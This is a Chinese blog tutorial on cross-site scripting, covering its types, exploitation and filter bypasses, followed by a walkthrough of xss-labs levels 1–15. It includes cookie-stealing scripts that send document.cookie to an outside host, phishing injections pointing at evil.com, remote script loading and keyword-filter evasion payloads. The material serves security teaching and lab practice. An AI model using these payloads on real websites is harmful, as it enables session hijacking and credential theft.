---
title: XSS（跨站脚本攻击）
date: 2022-8-20 19:50:38
tags: 
- Web
- Security
- XSS
categories: 
- web安全基础漏洞
---

# XSS（跨站脚本攻击）

## 一、简介

跨站脚本攻击（Cross Site Script），为了和层叠样式表(Cascading Style Sheet，CSS)有所区别，所以在安全领域叫做“XSS”。

XSS 攻击，通常指黑客通过“HTML 注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。XSS可能会被用于 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。

## 二、分类

XSS 根据效果的不同可以分成如下几类。 

### 第一种:反射型 XSS

反射型 XSS 只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要 诱使用户“点击”一个恶意链接，才能攻击成功。反射型 XSS 也叫做“非持久型 XSS”(Non-persistent XSS)。

假设一个页面把用户输入的参数直接输出到页面上:

```php+HTML
<?php
$input = $_GET["param"];
echo "<div>".$input."</div>";
?>
```

在正常情况下，用户向 param 提交的数据会展示到页面中，比如提交:

```
http://127.0.0.1:8080/xss/?param=it%27s%20a%20param
```

会得到：

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.12.28.png)

但是如果提交一段 HTML 代码:

```
http://127.0.0.1:8080/xss/?param=%3Cscript%3Ealert(/xss/)%3C/script%3E
```

在访问的时候，会发现，alert(/xss/)在当前页面执行了:

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.17.36.png)

而用户输入的 Script 脚本，已经被写入页面中。

### 第二种:存储型 XSS

存储型 XSS 会把用户输入的数据“存储”在服务器端。这种 XSS 具有很强的稳定性。比较常见的一个场景就是，黑客写下一篇包含有恶意  JavaScript 代码的博客文章，文章发 表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。  黑客把恶意的脚本保存到服务器端，所以这种 XSS 攻击就叫做“存储型 XSS”。存储型 XSS 通常也叫做“持久型  XSS”(Persistent XSS)，因为从效果上来说，它存在的时间是比较长的。

### 第三种:**DOM Based XSS**

实际上，这种类型的 XSS 并非按照“数据是否保存在服务器端”来划分，DOM Based XSS 从效果上来说也是反射型  XSS。单独划分出来，是因为 DOM Based XSS 的形成原因比较特别， 发现它的安全专家专门提出了这种类型的  XSS。出于历史原因，也就把它单独作为一个分类了。

通过修改页面的 DOM 节点形成的 XSS，称之为 DOM Based XSS。

```
<script>
function test(){
var str = document.getElementById("text").value; document.getElementById("t").innerHTML = "<a href=ˈ"+str+"ˈ >testLink</a>";
} </script>
<div id="t" ></div>
<input type="text" id="text" value="" />
<input type="button" id="s" value="write" onclick="test()" />
```

点击“write”按钮后，会在当前页面插入一个超链接，其地址为文本框的内容。在 test()函数中，修改了页面的 DOM 节点，通过 innerHTML 把一段用户数据当做 HTML 写入到页面中，这就造成了 DOM based XSS。

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.23.04.png)

构造如下数据:

`ˈ onclick=alert(/xss/) //`

输入后，页面代码就变成了: 

`<a href=ˈˈ onlick=alert(/xss/)//ˈ >testLink</a>`

首先用一个单引号闭合掉 href 的第一个单引号，然后插入一个 onclick 事件，最后再用注 释符“//”注释掉第二个单引号。点击这个新生成的链接，脚本将被执行: 

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.29.28.png)

实际上，这里还有另外一种利用方式——除了构造一个新事件外，还可以选择闭合掉 `<a>` 标签，并插入一个新的 HTML 标签。尝试如下输入:

```
ˈ><img src=# onerror=alert(/xss2/) /><ˈ
```

页面代码变成了:

`<a href=ˈˈ><img src=# onerror=alert(/xss2/) /><ˈˈ >testLink</a> `

由于img标签的地址非法，自动触发onerror事件，不用点击 `<a>` 标签也能让脚本被执行:

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.33.38.png)

## 三、利用方式

### Cookies 窃取

JS可以使用 `document.cookie` 属性从浏览器访问 cookie。并且我们可以通过 XSS 让网页执行 JS 代码发送到自己的服务器，例如：

```
<script>
var img = document.createElement("img");
img.src = "http://www.tawnx.com/log?"+escape(document.cookie);
document.body.appendChild(img);
</script>
```

这段代码在页面中插入了一张看不见的图片，同时把 document.cookie 对象作为参数发送到远程服务器。

也可以使用跳转来提交Cookies到自己的服务器，虽然还能让他跳转回来，但是这样较为明显

```
<body onload="window.location.href='http://www.tawnx.com/log?'+escape(document.cookie);"></body>
```

Cookie 的“HttpOnly”标识可以防止“Cookie 劫持”。

### 钓鱼

#### 重定向钓鱼

把当前页面重定向到一个钓鱼页面。

```
http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
```

#### HTML 注入式钓鱼

使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。例如利用 XSS 在当前页面上“画出”一个伪造的登录框，当用户在登录框中输入用户名与密码后，其数据将被发送至黑客的服务器上。

```
http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center;"><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password:<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/></form></div></body></html>
```

#### iframe 钓鱼

这种方式是通过 `<iframe>` 标签嵌入远程域的一个页面实施钓鱼。

```
http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"</iframe>
```

### 获取页面上的内容

可以利用js获取页面上的内容。

## 四、小技巧

### 常见js触发点

理论上xss注入可以使用各种事件，窗口事件、鼠标事件、键盘事件、媒体事件等等，须结合实际情况使用，自动触发且较为常用的有onload和onerror事件：

#### onload事件

onload 在所属标签完全载入后(包括图片、css文件等等)执行Javascript代码, 载入发生错误时不会执行。

```
<body onload="alert('loaded')">
```

以下 HTML 标签支持 onload :

```
<body>, <frame>, <frameset>, <iframe>, <img>, <input type="image">, <link>, <script>, <style>
```

#### onerror事件

onerror 事件在加载外部文件（文档或图像）发生错误时触发。

以下 HTML 标签支持 onerror :

```
<img>, <input type="image">, <object>, <script>, <style> 
```

#### JavaScript伪协议

JavaScript伪协议实际上是把 `javascript:` 后面的代码当JavaScript来执行，并将结果值返回给当前页面。如果有多个语句，使用 `;` 隔开。

```
javascript:alert('xss');
```

一般配合有href属性的标签使用，以下 HTML 标签支持 href 属性 :

```
<a>, <link>, <nav>
```

### 绕过输入长度限制

如果payload太长，可以将代码写在自己的服务器上，然后通过script标签加载远程脚本

`<script src=http://www.tawnx.com/evil.js ></script>`

也可以使用将代码放在 `location.hash` 。根据 HTTP 协议，`location.hash` 的内容不会在 HTTP 包中发送，所以服务器端的 Web 日志中并不会记录下 location.hash 里的内容，从而也更好地隐藏自己。因为 `location.hash` 的第一个字符是 # ，所以必须去除第一个字符才行。

`<script>eval(location.hash.substr(1))</script>`

国外的研究者terjanq 有一个集成式的短payload

https://tinyxss.terjanq.me/

### 绕过关键字过滤

#### 空格被过滤

可以使用注释 `/**/` 来绕过，也可以使用其他空字符，例如换行（urlencode：`%0a`）或者回车（urlencode：`%0d`）来替代

#### HTML Entities

如果被过滤的关键字可以放在html属性里，即引号之内的内容，可以使用html实体转义绕过。在线转换：https://www.qqxiuzi.cn/bianma/zifushiti.php

例如script关键字标签被过滤，这种情况下`<script>`标签就无法使用了。如果将它放在标签的属性里，就可以进行实体转义。例如使用`<a>`标签，配合javascript:伪协议再加上转义来绕过过滤执行代码，t转义成了`t`

```
<a href="javascrip&#x74;:alert('xss');">
```

#### String.fromCharCode

String.fromCharCode(*n1*, *n2*, ..., *nX*)接受多个unicode值，返回一个由多个unicode对应字符拼接成的字符串。

如果被过滤的关键字在js代码里，就可以使用String.fromCharCode。例如 `alert('xss')` 经过unicode编码为分别为 `97,108,101,114,116,40,39,120,115,115,39,41`

就可以使用如下代码来绕过过滤：

```
<script>
    eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))
</script>
```

同理还有replace等函数可以使用，不过使用它们的前提是已经能执行js代码了。

## 五、靶场

#### 前言

这里使用的xsslabs是国光修改过的版本，原先一共有20题，删去了xss flash相关的5题。

**项目地址**：https://github.com/sqlsec/xssgame

**安装方法**：直接解压源码到HTTP服务的目录下，浏览器直接访问即可，无需配置数据库等信息

#### 第1关 先热个身吧

无任何过滤，直接插入脚本。

payload: `<script>alert('xss')</script>`

#### 第2关 窒息的操作

首先想法就是闭合h2标签，然后alert，但是这样的话`<>`会被转义

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/图片.png)

因为请求的keyword参数会在input标签的value值里，这样的话就可以在input标签来注入。

payload: `" onclick=alert('XSS') "`

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-08-下午9.22.10.png)

然后通过点击这个input标签来触发。

#### 第3关 这该咋办啊

一眼看上去好像和前面的一样，但是实际上吧双引号给转义了,单引号还能用

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-08-下午9.30.44.png)

所以把双引号改成单引号就行了

#### 第4关 生无可恋

同第二关，查看源码发现是把`<>`过滤了，因为没用到`<>`，所以还可用。

#### 第5关 没错又是搜索

第五关直接把onclick替换成了o_nclick

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-08-下午9.40.50.png)

但是此时又是可以使用`<>`的，那么就简单了。那么经过一番尝试，发现on和script都会被替换，且无视大小写。看了源码后发现是过滤script标签，那么只能配合a标签使用javascript:alert(‘xss’)了

payload: `"><a href="javascript:alert('xss');"`

#### 第6关 嗯 还是搜索

这回连href也没了,搜了html中能触发js的地方，看了白帽子讲web安全中这一部分的内容，都没思路。最后看了源代码，发现大小写过滤没了，换个大小写就和前一题一样

#### 第7关 猜一猜下面题目还有搜索嘛

简单尝试了一下，发现会把像script、href等关键词替换为空，那么只需要嵌套双写即可。

payload: `"><a hrhrefef="javascrscriptipt:alert('xss');"`

#### 第8关 老铁要和我换友链嘛？

简单试了一下没成功，关键词都会被replace替换。看了别人payload发现可以使用html转义，

```
&#x74;//这个是字符t的转义
```

详细了解可以查看这个回答：https://www.zhihu.com/question/21390312/answer/18091465

payload: `javascrip&#x74:alert('xss');`

#### 第9关 添加友连again

看了源码，需要有 `http://` 字符出现，原先的想法是写在注释里，但是发现引号闭合不上，就直接把`http://`作为alert的内容了。同时，把它写在js注释里也是可以的。

payload: `javascrip&#x74:alert('xss');/*http://*/`

#### 第10关 嗯 搜索又出现了

看源码，过滤了`<>`

payload: `" type="text" onclick=alert('XSS') "`

#### 第11关 为什么这么多搜索呢

看了源码，和上一题一样，只不过是在要在请求头的`Referer`来注入。

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-09-下午4.32.09.png)

#### 第12关 黑人问号

和上一题一样，只不过注入点在User-Agent

![img](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-09-下午4.32.54.png)

#### 第13关 做题好爽啊

这次在Cookie

#### 第14关 恭喜你快要通关了

没招了。要用到ng-include:

> ng-include 指令用于包含外部的 HTML 文件。
>
> 包含的内容将作为指定元素的子节点。
>
> ng-include 属性的值可以是一个表达式，返回一个文件名。
>
> 默认情况下，包含的文件需要包含在同一个域名下。

用别人的payload没成功

#### 第15关 厉害了 Word哥

把空格和tab还有script过滤了，可以使用换行（urlencode：%0a）或者回车（urlencode：%0d）来替代

payload: `keyword=<img%0asrc=x%0aonerror=alert('XSS')>`